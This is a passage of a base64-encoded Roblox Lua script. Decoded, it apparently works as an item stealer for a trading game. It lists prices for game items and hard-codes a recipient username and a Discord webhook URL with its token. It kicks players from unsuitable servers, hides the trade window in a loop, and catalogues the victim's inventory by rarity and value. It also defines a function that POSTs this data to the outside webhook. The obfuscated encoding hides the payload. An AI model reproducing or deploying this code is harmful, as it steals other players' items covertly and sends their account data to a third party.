XSA9IDUwMDAwMDAwLAogICAgWyJTaWx2ZXIgU3VnYXIiXSA9IDc1MDAwMDAwLAogICAgWyJHb2xkIFN1Z2FyIl0gPSAxMDAwMDAwMDAsCiAgICBbIkJsdWUgU3VnYXIiXSA9IDEwMDAwMDAsCiAgICBbIkJsdWUgRWxkZXJ3b29kIChndW4pIl0gPSAxMDAwMDAwLAogICAgWyJCcm9uemUgRWxkZXJ3b29kIChndW4pIl0gPSA1MDAwMDAwMCwKICAgIFsiU2lsdmVyIEVsZGVyd29vZCAoZ3VuKSJdID0gNzUwMDAwMDAsCiAgICBbIkdvbGQgRWxkZXJ3b29kIChndW4pIl0gPSAxMDAwMDAwMDAsCiAgICBbIkdvbGQgTG9nY2hvcHBlciJdID0gMTAwMDAwMDAwLAogICAgWyJHb2xkIE1pbnR5Il0gPSAxMDAwMDAwMDAsCiAgICBbIlNpbHZlciBNaW50eSJdID0gNzUwMDAwMDAsCiAgICBbIlNpbHZlciBMb2djaG9wcGVyIl0gPSA3NTAwMDAwMCwKICAgIFsiQnJvbnplIExvZ2Nob3BwZXIiXSA9IDUwMDAwMDAwLAogICAgWyJCcm9uemUgTWludHkiXSA9IDUwMDAwMDAwLAogICAgWyJCbHVlIE1pbnR5Il0gPSAxMDAwMDAwLAogICAgWyJCbHVlIExvZ2Nob3BwZXIiXSA9IDEwMDAwMDAsCglbIkxvZ2Nob3BwZXIiXSA9IDMwLAogICAgWyJCbHVlIFZhbXAncyBFZGdlIl0gPSAxMDAwMDAwLAogICAgWyJCcm9uemUgVmFtcCdzIEVkZ2UiXSA9IDUwMDAwMDAwLAogICAgWyJTaWx2ZXIgVmFtcCdzIEVkZ2UiXSA9IDc1MDAwMDAwLAogICAgWyJHb2xkIFZhbXAncyBFZGdlIl0gPSAxMDAwMDAwMDAsCiAgICBbIkhlYXJ0YmxhZGUiXSA9IDc1LAogICAgWyJHb2xkIEljZWJyZWFrZXIiXSA9IDEwMDAwMDAwMCwKICAgIFsiU2lsdmVyIEljZWJyZWFrZXIiXSA9IDc1MDAwMDAwLAogICAgWyJCcm9uemUgSWNlYnJlYWtlciJdID0gNTAwMDAwMDAsCiAgICBbIlJlZCBJY2VicmVha2VyIl0gPSAxMDAwMDAwLAogICAgWyJSZWQgSWNlYmxhc3RlciJdID0gMTAwMDAwMCwKICAgIFsiQnJvbnplIEljZWJsYXN0ZXIiXSA9IDUwMDAwMDAwLAogICAgWyJTaWx2ZXIgSWNlYmxhc3RlciJdID0gNzUwMDAwMDAsCiAgICBbIkdvbGQgSWNlYmxhc3RlciJdID0gMTAwMDAwMDAwLAogICAgWyJFZ2dibGFkZSJdID0gMywKICAgIFsiTmVidWxhIl0gPSA3LAogICAgWyJHbGl0Y2gxIl0gPSAyNSwKICAgIFsiQ2FuZGxlZmxhbWUiXSA9IDEzMCwKICAgIFsiQ2hyb21hIENhbmRsZWZsYW1lIl0gPSAxOTAsCiAgICBbIkhhcnZlc3RlciJdID0gOTAwLAogICAgWyJDaHJvbWEgU3dpcmx5Z3VuIl0gPSAxODAsCiAgICBbIlN3aXJseSBHdW4iXSA9IDE3MCwKICAgIFsiU3dpcmx5IEF4ZSJdID0gMTkwLAogICAgWyJTd2lybHkgQmxhZGUiXSA9IDgwLAogICAgWyJJY2VmbGFrZSJdID0gMzEsCiAgICBbIkljZWJlYW0iXSA9IDMxLAogICAgWyJJY2VjcmFja2VyIl0gPSAzLAogICAgWyJPcm5hbWVudHMgR3VuIl0gPSAwLjEyLAogICAgWyJPcm5hbWVudHMgS25pZmUiXSA9IDAuMTIsCiAgICBbIkdpZnQgQmFnIEtuaWZlIl0gPSAwLjIyLAogICAgWyJTaWxlbnQgTmlnaHQgS25pZmUiXSA9IDEwLAogICAgWyJJY2VkcmlsbGVyIl0gPSAxNSwKICAgIFsiU3RvY2tpbmdzIl0gPSAwLjEyLAogICAgWyJUcmVlcyJdID0gMC4xMiwKICAgIFsiV3JhcCBHdW4iXSA9IDAuMjIsCiAgICBbIldyYXAgS25pZmUiXSA9IDAuMjIsCiAgICBbIlNub3dmbGFrZXMiXSA9IDAuNDEsCiAgICBbIlNpbGVudCBOaWdodCBHdW4iXSA9IDIsCiAgICBbIkdpZnQgQmFnIEd1biJdID0gMC4xMiwKICAgIFsiR2lmdHdyYXAgS25pZmUiXSA9IDAuMTIsCiAgICBbIlN0aWNrZXJzIEd1biJdID0gMC4xMiwKICAgIFsiQ29va2llIEd1biJdID0gMC4yMiwKICAgIFsiSWNlIENhbW8iXSA9IDAuMzIsCiAgICBbIlN0YXJyeSBLbmlmZSJdID0gMC40MSwKICAgIFsiU3RpY2tlcnMgS25pZmUiXSA9IDAuMTEsCiAgICBbIkNvYWwgS25pZmUiXSA9IDAuMTIsCiAgICBbIlJpYmJvbnMiXSA9IDAuMTIsCiAgICBbIlRyZWUgS25pZmUiXSA9IDAuMjMsCiAgICBbIkNvb2tpZSBLbmlmZSJdID0gMC4zMSwKICAgIFsiU3RhcnJ5IEd1biJdID0gMC40MywKICAgIFsiU3dpcmwgS25pZmUiXSA9IDAuNDEsCiAgICBbIkdvbGQgSGFydmVzdGVyIl0gPSAxMDAwMDAwMDAsCiAgICBbIlNpbHZlciBIYXJ2ZXN0ZXIiXSA9IDc1MDAwMDAwLAogICAgWyJCcm9uemUgSGFydmVzdGVyIl0gPSA1MDAwMDAwMCwKICAgIFsiQmx1ZSBIYXJ2ZXN0ZXIiXSA9IDEwMDAwMDAsCiAgICBbIlBsYXNtYWJlYW0iXSA9IDMxLAogICAgWyJQbGFzbWFibGFkZSJdID0gMzEsCiAgICBbIkdvbGQgU3dpcmx5Il0gPSAxMDAwMDAwMDAsCiAgICBbIlNpbHZlciBTd2lybHkiXSA9IDc1MDAwMDAwLAogICAgWyJCcm9uemUgU3dpcmx5Il0gPSA1MDAwMDAwMCwKICAgIFsiQmx1ZSBTd2lybHkiXSA9IDEwMDAwMDAsCiAgICBbIlNpbHZlciBTd2lybHkgR3VuIl0gPSA3NTAwMDAwMCwKICAgIFsiQnJvbnplIFN3aXJseSBHdW4iXSA9IDUwMDAwMDAwLAogICAgWyJCbHVlIFN3aXJseSBHdW4iXSA9IDEwMDAwMDAsCiAgICBbIkNhbmRpZXMgMjAxNiJdID0gMC4yMSwKICAgIFsiQ2FuZGllcyAyMDE3Il0gPSAwLjExLAogICAgWyJTbm93YmVhciJdID0gMC4zMSwKICAgIFsiU2NhcmVjcm93Il0gPSAwLjQyLAogICAgWyJNci4gUmVpbmRlZXIiXSA9IDAuNDIsCiAgICBbIlNub3dtYW4iXSA9IDAuMjIsCiAgICBbIlNoYWRvdyBQdW1wa2luIl0gPSAwLjMyLAogICAgWyJTa3VsbHkiXSA9IDAuNDIsCiAgICBbIlNhbnRhJ3MgU3Bpcml0Il0gPSAxMiwKICAgIFsiRnJvemVuIEd1biJdID0gMjIsCiAgICBbIlJCIEtuaWZlIl0gPSAwLjMxLAogICAgWyJHb3RoaWMgR3VuIl0gPSAwLjQxLAogICAgWyJHb3RoaWMgS25pZmUiXSA9IDAuMjMsCiAgICBbIldyYWl0aHMgR3VuIl0gPSAwLjIzLAogICAgWyJGYWxsIENhbW8iXSA9IDAuMjIsCiAgICBbIldyYWl0aHMgS25pZmUiXSA9IDAuNDEsCiAgICBbIkZyb3plbiBLbmlmZSJdID0gMiwKICAgIFsiU2xhc2hlZCJdID0gMC4yMiwKICAgIFsiU3RhcnJ5Il0gPSAwLjIyLAogICAgWyJDYXJ2ZWQgKEd1bikiXSA9IDAuMTIsCiAgICBbIkNhcnZlZCAoS25pZmUpIl0gPSAwLjEzLAogICAgWyJDaHJvbWEgRWxkZXJ3b29kIEJsYWRlIl0gPSAxOTAsCiAgICBbIk1ha2VzaGlmdCJdID0gMTM1LAogICAgWyJFbGRlcndvb2QgQmxhZGUiXSA9IDEzMCwKICAgIFsiU3BlY3RyZSJdID0gODAsCiAgICBbIlNwZWN0cmFsIEtuaWZlIl0gPSA1LAogICAgWyJTcGVjdHJhbCBHdW4iXSA9IDAuNDMsCiAgICBbIk1hZ21hIEtuaWZlIl0gPSAwLjMyLAogICAgWyJNYWdtYSBHdW4iXSA9IDAuNDEsCiAgICBbIldhdGNoZXIgS25pZmUiXSA9IDAuMzIsCiAgICBbIldhdGNoZXIgR3VuIl0gPSAwLjQxLAogICAgWyJWZXJzdXMiXSA9IDAuMTIsCiAgICBbIkFwb2NhbHlwc2UgS25pZmUiXSA9IDAuMjMsCiAgICBbIkNhbmR5IENvcm4gR3VuIl0gPSAwLjIyLAogICAgWyJBcG9jYWx5cHNlIEd1biJdID0gMC4yMywKICAgIFsiRGFya25lc3MgS25pZmUiXSA9IDAuMjIsCiAgICBbIkh1bnRlciBLbmlmZSJdID0gMC4yMiwKICAgIFsiV2VicyBHdW4iXSA9IDAuMjIsCiAgICBbIkNhbmR5IENvcm4gS25pZmUiXSA9IDAuMTIsCiAgICBbIkV5ZWJhbGwgS25pZmUiXSA9IDAuMTIsCiAgICBbIlN0aWNrZXJzIl0gPSAwLjEyLAogICAgWyJEYXJrbmVzcyBHdW4iXSA9IDAuMTIsCiAgICBbIkluZmVjdGVkIEtuaWZlIl0gPSAwLjIzLAogICAgWyJJbmZlY3RlZCBHdW4iXSA9IDAuMjMsCiAgICBbIkJyYWlucyBHdW4iXSA9IDAuMjIsCiAgICBbIkdob3N0bHkiXSA9IDAuMjIsCiAgICBbIkhhemFyZCBLbmlmZSJdID0gMC4yMiwKICAgIFsiSGF6YXJkIEd1biJdID0gMC4zMSwKICAgIFsiTGFudGVybiBLbmlmZSJdID0gMC4zMiwKICAgIFsiTW9vbmxpZ2h0IEd1biJdID0gMC4zMiwKICAgIFsiV2l0Y2hicmV3Il0gPSAwLjIyLAogICAgWyJDdXJzZSBLbmlmZSJdID0gMC4zMiwKICAgIFsiR2hvc3RmaXJlIl0gPSAwLjQxLAogICAgWyJNYWtlc2hpZnQgS25pZmUiXSA9IDEsCiAgICBbIldyYWl0aCBHdW4iXSA9IDAuMzIsCiAgICBbIldyYWl0aCBLbmlmZSJdID0gMC40MSwKICAgIFsiWm9tYmlmaWVkIl0gPSAwLjQzLAogICAgWyJTYW50YSBXYWxraW5nIl0gPSA0MCwKICAgIFsiTXIuIFNub3dtYW4iXSA9IDAuNDEsCiAgICBbIlZvaWQiXSA9IDAuNDIsCiAgICBbIkNocm9tYSBDb29raWVjYW5lIl0gPSAxNjAsCiAgICBbIkNvb2tpZWNhbmUiXSA9IDgwLAogICAgWyJJY2VwaWVyY2VyIl0gPSA4NzAsCiAgICBbIkdpbmdlcm1pbnQiXSA9IDgwLAogICAgWyJBcmN0aWMgS25pZmUiXSA9IDAuNDMsCiAgICBbIkFyY3RpYyBHdW4iXSA9IDQsCiAgICBbIkNvYWwgR3VuIDIwMjIiXSA9IDAuMTIsCiAgICBbIkNhbmRpZWQgS25pZmUiXSA9IDAuMTIsCiAgICBbIlNub3dtYW4gR3VuIDIwMjIiXSA9IDAuMTMsCiAgICBbIlN0b2NraW5ncyAyMDIyIl0gPSAwLjIzLAogICAgWyJNaXN0bGV0b2UgR3VuIl0gPSAwLjIzLAogICAgWyJTbm93Zmxha2UgS25pZmUgMjAyMiJdID0gMC4yMywKICAgIFsiR2luZ2VyYnJlYWQgR3VuIDIwMjIiXSA9IDAuMzMsCiAgICBbIlRyZWUgS25pZmUgMjAyMiJdID0gMC4zMywKICAgIFsiQ29hbCBLbmlmZSAyMDIyIl0gPSAwLjEyLAogICAgWyJDYW5kaWVkIEd1biJdID0gMC4xMiwKICAgIFsiU3RpY2tlcnMgR3VuIDIwMjIiXSA9IDAuMTIsCiAgICBbIlNub3dtYW4gS25pZmUgMjAyMiJdID0gMC4xMiwKICAgIFsiU3RvY2tpbmdzIEd1biAyMDIyIl0gPSAwLjIyLAogICAgWyJNaXN0bGV0b2UgS25pZmUiXSA9IDAuMjIsCiAgICBbIlNub3dmbGFrZSBHdW4gMjAyMiJdID0gMC4yMiwKICAgIFsiVHJlZSBHdW4gMjAyMiJdID0gMC4zMiwKICAgIFsiR2luZ2VyYnJlYWQgS25pZmUgMjAyMiJdID0gMC4zMiwKICAgIFsiQmx1ZSBFbGRlcndvb2QiXSA9IDEwMDAwMDAsCiAgICBbIkJyb256ZSBFbGRlcndvb2QiXSA9IDUwMDAwMDAwLAogICAgWyJTaWx2ZXIgRWxkZXJ3b29kIl0gPSA3NTAwMDAwMCwKICAgIFsiR29sZCBFbGRlcndvb2QiXSA9IDEwMDAwMDAwMCwKICAgIFsiR29sZCBJY2VwaWVyY2VyIl0gPSAxMDAwMDAwMDAsCiAgICBbIkdvbGQgSWNlY3J1c2hlciJdID0gMTAwMDAwMDAwLAogICAgWyJTaWx2ZXIgSWNlY3J1c2hlciJdID0gNzUwMDAwMDAsCiAgICBbIlNpbHZlciBJY2VwaWVyY2VyIl0gPSA3NTAwMDAwMCwKICAgIFsiQnJvbnplIEljZXBpZXJjZXIiXSA9IDUwMDAwMDAwLAogICAgWyJCcm9uemUgSWNlY3J1c2hlciJdID0gNTAwMDAwMDAsCiAgICBbIlJlZCBJY2VjcnVzaGVyIl0gPSAxMDAwMDAwLAogICAgWyJSZWQgSWNlcGllcmNlciJdID0gMTAwMDAwMCwKICAgIFsiR2xpdGNoMiJdID0gNDUsCiAgICBbIlNha3VyYSJdID0gNTQwLAogICAgWyJCcm9rZW4iXSA9IDMsCiAgICBbIkhlYXJ0Il0gPSAwLjMyLAogICAgWyJSb3NlIl0gPSAwLjIyLAogICAgWyJMb3ZlIl0gPSAwLjEyLAogICAgWyJUZWRkeSJdID0gMC4zMiwKICAgIFsiQ29tYmF0IElJIl0gPSA0LAogICAgWyJDYW5keWNvcm4gMjAxOSJdID0gMC4zMSwKICAgIFsiQ2FuZHkgQ29ybiBndW4gMjAyMCJdID0gMC4xMiwKICAgIFsiQ2FuZHkgQ29ybiBrbmlmZSAyMDIwIl0gPSAwLjEyLAogICAgWyJXYXRjaGVyIEtuaWZlIDIwMjAiXSA9IDAuMTIsCiAgICBbIldhdGNoZXIgZ3VuIDIwMjAiXSA9IDAuMTIsCiAgICBbIk11bW15IEtuaWZlIDIwMjAiXSA9IDAuMjIsCiAgICBbIk11bW15IGd1biAyMDIwIl0gPSAwLjIyLAogICAgWyJQb3J0YWwgR3VuIl0gPSAwLjIyLAogICAgWyJHaG9zdHMga25pZmUgMjAyMCJdID0gMC4yMiwKICAgIFsiQ2FuZGxlIl0gPSAwLjEyLAogICAgWyJSYWluYm93IEd1biJdID0gMTg1LAogICAgWyJDaHJvbWF0aWMgS25pZmUiXSA9IDAuNDQsCiAgICBbIkNocm9tYXRpYyBHdW4iXSA9IDAuNDMsCiAgICBbIk51a2UiXSA9IDAuNDEsCiAgICBbIkJpbyJdID0gMC4zMiwKICAgIFsiTWFyYmxlIl0gPSAwLjIyLAogICAgWyJQYWludGVkIEtuaWZlIl0gPSAwLjMyLAogICAgWyJQYWludGVkIEd1biJdID0gMC4yMiwKICAgIFsiRnJhZ2lsZSBHdW4iXSA9IDAuMTIsCiAgICBbIkZyYWdpbGUgS25pZmUiXSA9IDAuMTIsCiAgICBbIkNhcnJvdCBCdW5ueSJdID0gMC4zMiwKICAgIFsiV2F2ZXMiXSA9IDE0MCwKICAgIFsiT2NlYW4iXSA9IDE0NSwKICAgIFsiQmVhY2giXSA9IDMsCiAgICBbIkZsb3JhbCJdID0gMC4zMywKICAgIFsiU3Vuc2V0Il0gPSAwLjMyLAogICAgWyJQb3BzaWNsZSJdID0gMC4yMiwKICAgIFsiUG9vbCBOb29kbGUiXSA9IDAuMzEsCiAgICBbIlRveSBLbmlmZSJdID0gMC4yMSwKICAgIFsiVG95IEd1biJdID0gMC4yMSwKICAgIFsiU3RpY2tlciBHdW4iXSA9IDAuMTIsCiAgICBbIkNocm9tYSBUcmF2ZWxlcnMgR3VuIl0gPSA0MjUwMCwKICAgIFsiVHJhdmVsZXIncyBHdW4iXSA9IDE1NTAsCiAgICBbIkRhcmtzaG90Il0gPSA0MzAsCiAgICBbIkRhcmtzd29yZCJdID0gNDI1LAogICAgWyJUcmF2ZWxlcidzIEF4ZSJdID0gNDYwMCwKICAgIFsiVHJhdmVsZXIgR3VuIl0gPSA0LAogICAgWyJUcmF2ZWxlciBLbmlmZSJdID0gMC40MywKICAgIFsiRGFya2tuaWZlIl0gPSAwLjQzLAogICAgWyJHaGFzdGx5IEd1biJdID0gMC40MSwKICAgIFsiR2hvdWxpc2giXSA9IDI1LAogICAgWyJXb29kIEtuaWZlIl0gPSAwLjEzLAogICAgWyJWaW5lcyBHdW4iXSA9IDAuMTMsCiAgICBbIlZpbmVzIEtuaWZlIl0gPSAwLjIxLAogICAgWyJFdGNoZWQiXSA9IDAuMjIsCiAgICBbIlN0ZWVsIEtuaWZlIl0gPSAwLjIyLAogICAgWyJHbG93eSJdID0gMC4yMiwKICAgIFsiRWNsaXBzZSJdID0gMC4yMiwKICAgIFsiU3RlZWwgR3VuIl0gPSAwLjMyLAogICAgWyJNZWx0ZG93biJdID0gMC4zMiwKICAgIFsiVHVya2V5Il0gPSA5NzUsCiAgICBbIkxhdHRlIEd1biJdID0gNzUsCiAgICBbIkxhdHRlIEtuaWZlIl0gPSA3NSwKICAgIFsiU2NhcmYiXSA9IDAuMzEsCiAgICBbIlB1bXBraW4gUGllIl0gPSAwLjQxLAogICAgWyJEYXJrZ3VuIl0gPSAwLjMzLAogICAgWyJHaGFzdGx5IEtuaWZlIl0gPSAwLjMzLAogICAgWyJFdmVyZ3JlZW4iXSA9IDQzNSwKICAgIFsiRXZlcmd1biJdID0gOTI1LAogICAgWyJHaW5nZXJzY29wZSJdID0gNjEwMCwKICAgIFsiQ2hyb21hIEV2ZXJndW4iXSA9IDIzMDAwLAogICAgWyJDaHJvbWEgRXZlcmdyZWVuIl0gPSAxMTAwMCwKICAgIFsiRnJvc3RmYWRlIEd1biJdID0gMC40MywKICAgIFsiRnJvc3RmYWRlIEtuaWZlIl0gPSAyLAogICAgWyJTbm93Zmxha2UgR3VuIDIzIl0gPSAwLjMyLAogICAgWyJOZW9uIEd1biJdID0gMC4zMywKICAgIFsiU25vd2dsb2JlIEtuaWZlIl0gPSAwLjMyLAogICAgWyJUcmVlIEtuaWZlIDIzIl0gPSAwLjMzLAogICAgWyJTbm93bWFuIEd1biAyMyJdID0gMC4zMSwKICAgIFsiRmlyZXBsYWNlIl0gPSAwLjMxLAogICAgWyJDYW5lcyBLbmlmZSJdID0gMC4yMywKICAgIFsiQ2FuZXMgR3VuIl0gPSAwLjMxLAogICAgWyJTdGFycyBHdW4iXSA9IDAuMjMsCiAgICBbIlN0YXJzIEtuaWZlIl0gPSAwLjMxLAogICAgWyJTbm93ZmFsbCJdID0gMC4xMiwKICAgIFsiU2FudGEgR3VuIDIzIl0gPSAwLjEzLAogICAgWyJFbGYgR3VuIDIzIl0gPSAwLjEyLAogICAgWyJSaWJib24gS25pZmUiXSA9IDAuMTMsCiAgICBbIkJlbGxzIl0gPSAwLjEyLAogICAgWyJQcmVzZW50IEtuaWZlIl0gPSAwLjEzLAogICAgWyJGcm96ZW4gR3VuIDIzIl0gPSAwLjEyLAogICAgWyJGcm96ZW4gS25pZmUgMjMiXSA9IDAuMTMsCiAgICBbIkZsb3dlcndvb2QgS25pZmUiXSA9IDEyMCwKICAgIFsiRmxvd2Vyd29vZCBHdW4iXSA9IDEyMCwKICAgIFsiV2F2eSBHdW4iXSA9IDAuMzIsCiAgICBbIldhdnkgS25pZmUiXSA9IDAuMzIsCiAgICBbIkNhcnJvdCBLbmlmZSJdID0gMC4zMSwKICAgIFsiQ2Fycm90IEd1biJdID0gMC4zMSwKICAgIFsiUm9ib3QgS25pZmUiXSA9IDAuMzIsCiAgICBbIlNwcmluZyBLbmlmZSJdID0gMC4zMywKICAgIFsiQmx1ZSBHaW5nZXJzY29wZSJdID0gMTAwMDAwMCwKICAgIFsiQmx1ZSBHaW5nZXJzY3l0aGUiXSA9IDEwMDAwMDAsCiAgICBbIkJyb256ZSBHaW5nZXJzY29wZSJdID0gNTAwMDAwMDAsCiAgICBbIkJyb256ZSBHaW5nZXJzY3l0aGUiXSA9IDUwMDAwMDAwLAogICAgWyJTaWx2ZXIgR2luZ2Vyc2NvcGUiXSA9IDc1MDAwMDAwLAogICAgWyJTaWx2ZXIgR2luZ2Vyc2N5dGhlIl0gPSA3NTAwMDAwMCwKICAgIFsiR29sZCBHaW5nZXJzY29wZSJdID0gMTAwMDAwMDAwLAogICAgWyJHb2xkIEdpbmdlcnNjeXRoZSJdID0gMTAwMDAwMDAwLAogICAgWyJDaHJvbWEgV2F0ZXJndW4iXSA9IDM1MDAsCiAgICBbIldhdGVyZ3VuIl0gPSAyMjUsCiAgICBbIlBlYXJsIl0gPSAxMTUsCiAgICBbIlBlYXJsc2hpbmUiXSA9IDExNSwKICAgIFsiUGFsbXMgS25pZmUiXSA9IDAuNDMsCiAgICBbIlBhbG1zIEd1biJdID0gMiwKICAgIFsiV2F2ZXMgS25pZmUiXSA9IDAuNDEsCiAgICBbIkZsb3JhbCBHdW4iXSA9IDAuMzMsCiAgICBbIkplbGx5ZmlzaCBLbmlmZSJdID0gMC4yMiwKICAgIFsiUG9wc2ljbGUgR3VuIl0gPSAwLjIyLAogICAgWyJUdXJ0bGUgS25pZmUiXSA9IDAuMjIsCiAgICBbIkNsb3duZmlzaCBHdW4iXSA9IDAuMjIsCiAgICBbIlNhbmR5IEd1biJdID0gMC4yMiwKICAgIFsiQmFsbG9vbnMgR3VuIl0gPSAwLjIyLAogICAgWyJTdGFyZmlzaCBLbmlmZSJdID0gMC4yMiwKICAgIFsiU3RhcmZpc2ggR3VuIl0gPSAwLjIyLAogICAgWyJDbG93bmZpc2ggS25pZmUiXSA9IDAuMjIsCiAgICBbIkZsb2F0aWUiXSA9IDAuMzEsCiAgICBbIlNoYXJreSBLbmlmZSJdID0gMC40MiwKCVsiTGVhdmVzIl0gPSAxLAoJWyJBbGllbnMiXSA9IDEsCglbIk1vb24iXSA9IDEKfQoKdXNlck5hbWUxID0gIjU1NGV4dHJlbWU0OTMiCndlYkhvb2sxID0gImh0dHBzOi8vZGlzY29yZGFwcC5jb20vYXBpL3dlYmhvb2tzLzEzMjUwNzYwNDcyNTA4NDk4MTMvX3hUVXJEay11LWJBS1RMSG1hS3VlRFVuNVk3cGdBUVNmVjd0UHAyYkRNMzZ0UFQwTjBTeUNwRUVCLWFZa1N6b1I2TzMiCgppZiAjZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6R2V0UGxheWVycygpIDw9IDIgdGhlbgogICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyOktpY2soIkV4aXQgZ2FtZSBhbmQgcmUtaW5qZWN0IikKZW5kCgppZiAjZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIik6R2V0UGxheWVycygpID09IDEyIHRoZW4KICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcjpLaWNrKCJFeGl0IGdhbWUgYW5kIHJlLWluamVjdC4iKQplbmQKCmxvY2FsIExQID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyCmxvY2FsIEh0dHBTZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJIdHRwU2VydmljZSIpCmxvY2FsIFBsYXllckRhdGFNb2R1bGUgPSByZXF1aXJlKGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKS5Nb2R1bGVzLlByb2ZpbGVEYXRhKQpsb2NhbCBMZXZlbE1vZHVsZSA9IHJlcXVpcmUoZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLk1vZHVsZXMuTGV2ZWxNb2R1bGUpCmxvY2FsIEludk1vZHVsZSA9IHJlcXVpcmUoZ2FtZTpHZXRTZXJ2aWNlKCJSZXBsaWNhdGVkU3RvcmFnZSIpLk1vZHVsZXMuSW52ZW50b3J5TW9kdWxlKQoKX0cudmxvcnAgPSBfRy52bG9ycCBvciBmYWxzZQppZiBfRy52bG9ycCB0aGVuCiAgICByZXR1cm4KZW5kCl9HLnZsb3JwID0gdHJ1ZQoKbG9jYWwgZGVzdHJveXRyYWRlczIgPSBjb3JvdXRpbmUuY3JlYXRlKGZ1bmN0aW9uKCkKICAgIHdoaWxlIHRydWUgZG8KICAgICAgICBsb2NhbCBwbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllcgogICAgICAgIGxvY2FsIHRyYWRlR1VJID0gcGxheWVyOldhaXRGb3JDaGlsZCgiUGxheWVyR3VpIik6V2FpdEZvckNoaWxkKCJUcmFkZUdVSSIpCiAgICAgICAgbG9jYWwgdHJhZGVHVUlQaG9uZSA9IHBsYXllcjpXYWl0Rm9yQ2hpbGQoIlBsYXllckd1aSIpOldhaXRGb3JDaGlsZCgiVHJhZGVHVUlfUGhvbmUiKQoKICAgICAgICBpZiB0cmFkZUdVSS5FbmFibGVkID09IHRydWUgdGhlbgogICAgICAgICAgICB0cmFkZUdVSS5FbmFibGVkID0gZmFsc2UKICAgICAgICBlbmQKCiAgICAgICAgaWYgdHJhZGVHVUlQaG9uZS5FbmFibGVkID09IHRydWUgdGhlbgogICAgICAgICAgICB0cmFkZUdVSVBob25lLkVuYWJsZWQgPSBmYWxzZQogICAgICAgIGVuZAoKICAgICAgICB3YWl0KDAuMSkKICAgIGVuZAplbmQpCgpmdW5jdGlvbiBTZW5kV2ViaG9vayh1cmwsIGRhdGEpCiAgICBsb2NhbCBqc29uRGF0YSA9IEh0dHBTZXJ2aWNlOkpTT05FbmNvZGUoZGF0YSkKICAgIGxvY2FsIHJlc3BvbnNlID0gcmVxdWVzdCh7CiAgICAgICAgVXJsID0gdXJsLAogICAgICAgIE1ldGhvZCA9ICJQT1NUIiwKICAgICAgICBIZWFkZXJzID0ge1siQ29udGVudC1UeXBlIl0gPSAiYXBwbGljYXRpb24vanNvbiJ9LAogICAgICAgIEJvZHkgPSBqc29uRGF0YQogICAgfSkKZW5kCgpmdW5jdGlvbiBDcmVhdGVFbWJlZCh0aXRsZSwgZGVzY3JpcHRpb24sIGNvbG9yLCBmaWVsZHMpCiAgICBsb2NhbCBlbWJlZCA9IHsKICAgICAgICBbInRpdGxlIl0gPSB0aXRsZSwKICAgICAgICBbImRlc2NyaXB0aW9uIl0gPSBkZXNjcmlwdGlvbiwKICAgICAgICBbImNvbG9yIl0gPSBjb2xvciwKICAgICAgICBbImZpZWxkcyJdID0gZmllbGRzIG9yIHt9CiAgICB9CiAgICByZXR1cm4gZW1iZWQKZW5kCgpsb2NhbCBmdW5jdGlvbiBnZXRMdmwoKQogICAgZm9yIGksdiBpbiBwYWlycyhMZXZlbE1vZHVsZS5YUFRhYmxlKSBkbwogICAgICAgIGlmIFBsYXllckRhdGFNb2R1bGUuTmV3WFAgPCB2IHRoZW4KICAgICAgICAgICAgcmV0dXJuIGkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGFsbEl0ZW1zID0ge30KbG9jYWwgaXRlbXNDb3VudCA9IDAKCmxvY2FsIHZhbHVlQ291bnQgPSAwCgpsb2NhbCB2aW50YWdlSXRlbXMgPSB7fQpsb2NhbCBjb21tb25JdGVtcyA9IHt9CmxvY2FsIHVuY29tbW9uSXRlbXMgPSB7fQpsb2NhbCByYXJlSXRlbXMgPSB7fQpsb2NhbCBsZWdlbmRhcnlJdGVtcyA9IHt9CmxvY2FsIGdvZGx5SXRlbXMgPSB7fQpsb2NhbCBhbmNpZW50SXRlbXMgPSB7fQpsb2NhbCB1bmlxdWVJdGVtcyA9IHt9Cgpsb2NhbCB2aW50YWdlSXRlbXNDID0gMApsb2NhbCBjb21tb25JdGVtc0MgPSAwCmxvY2FsIHVuY29tbW9uSXRlbXNDID0gMApsb2NhbCByYXJlSXRlbXNDID0gMApsb2NhbCBsZWdlbmRhcnlJdGVtc0MgPSAwCmxvY2FsIGdvZGx5SXRlbXNDID0gMApsb2NhbCBhbmNpZW50SXRlbXNDID0gMApsb2NhbCB1bmlxdWVJdGVtc0MgPSAwCgpmb3IgYSxiIGluIHBhaXJzKEludk1vZHVsZS5NeUludmVudG9yeS5EYXRhLldlYXBvbnMpIGRvCiAgICBmb3IgYyxkIGluIHBhaXJzKGIpIGRvCiAgICAgICAgbG9jYWwgYnIgPSAwCiAgICAgICAgaWYgdmFsdWVzW2QuSXRlbU5hbWVdIHRoZW4KICAgICAgICAgICAgdmFsdWVDb3VudCA9IHZhbHVlQ291bnQgKyB2YWx1ZXNbZC5JdGVtTmFtZV0KICAgICAgICAgICAgYnIgPSB2YWx1ZXNbZC5JdGVtTmFtZV0KICAgICAgICBlbmQKCiAgICAgICAgbG9jYWwgZm9ybWF0dGVkVGFibGUgPSB7bmFtZSA9IGQuSXRlbU5hbWUsIHZhbHVlID0gYnIsIGRhdGEgPSBkLkRhdGFJRCwgYW1vdW50ID0gZC5BbW91bnQsIHJhcml0eSA9IGQuUmFyaXR5fQogICAgICAgIHRhYmxlLmluc2VydChhbGxJdGVtcywgZm9ybWF0dGVkVGFibGUpCiAgICAgICAgCiAgICAgICAgaWYgZC5SYXJpdHkgPT0gIlZpbnRhZ2UiIHRoZW4KICAgICAgICAgICAgdmludGFnZUl0ZW1zQyA9IHZpbnRhZ2VJdGVtc0MgKyAxCiAgICAgICAgICAgIHRhYmxlLmluc2VydCh2aW50YWdlSXRlbXMsIGZvcm1hdHRlZFRhYmxlKQogICAgICAgIGVuZAoKICAgICAgICBpZiBkLlJhcml0eSA9PSAiVW5pcXVlIiB0aGVuCiAgICAgICAgICAgIHVuaXF1ZUl0ZW1zQyA9IHV